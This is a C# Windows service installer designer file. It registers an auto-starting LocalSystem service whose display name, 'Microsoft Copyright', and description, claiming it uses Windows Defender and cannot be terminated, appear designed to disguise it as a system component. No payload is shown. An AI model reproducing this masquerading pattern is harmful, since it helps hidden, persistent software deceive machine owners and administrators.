
namespace ConfigServices
{
    partial class ProjectInstaller
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ServiceProcess.ServiceInstaller serviceInstaller1;
            this.serviceProcessInstaller1 = new System.ServiceProcess.ServiceProcessInstaller();
            serviceInstaller1 = new System.ServiceProcess.ServiceInstaller();
            // 
            // serviceInstaller1
            // 
            serviceInstaller1.Description = "This Service uses Windows Defender. This Service Cannot Be Terminated.";
            serviceInstaller1.DisplayName = "Microsoft Copyright";
            serviceInstaller1.ServiceName = "SmartBoardServiceSystm";
            serviceInstaller1.StartType = System.ServiceProcess.ServiceStartMode.Automatic;
            serviceInstaller1.AfterInstall += new System.Configuration.Install.InstallEventHandler(this.serviceInstaller1_AfterInstall);
            // 
            // serviceProcessInstaller1
            // 
            this.serviceProcessInstaller1.Account = System.ServiceProcess.ServiceAccount.LocalSystem;
            this.serviceProcessInstaller1.Password = null;
            this.serviceProcessInstaller1.Username = null;
            this.serviceProcessInstaller1.Committed += new System.Configuration.Install.InstallEventHandler(this.serviceProcessInstaller1_Committed);
            // 
            // ProjectInstaller
            // 
            this.Installers.AddRange(new System.Configuration.Install.Installer[] {
            serviceInstaller1,
            this.serviceProcessInstaller1});

        }

        #endregion

        private System.ServiceProcess.ServiceProcessInstaller serviceProcessInstaller1;
    }
}